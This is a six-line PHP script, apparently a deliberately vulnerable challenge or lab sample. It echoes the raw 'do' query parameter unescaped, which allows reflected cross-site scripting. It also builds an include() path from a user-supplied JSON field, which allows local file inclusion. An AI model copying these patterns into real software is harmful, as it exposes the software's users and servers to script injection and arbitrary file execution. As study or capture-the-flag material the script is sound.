<?php
require 'pop.php';
echo $_GET["do"];
$d = json_decode($_GET["do"],true);
include('__' . $d['cmd'] . '.php');
?>
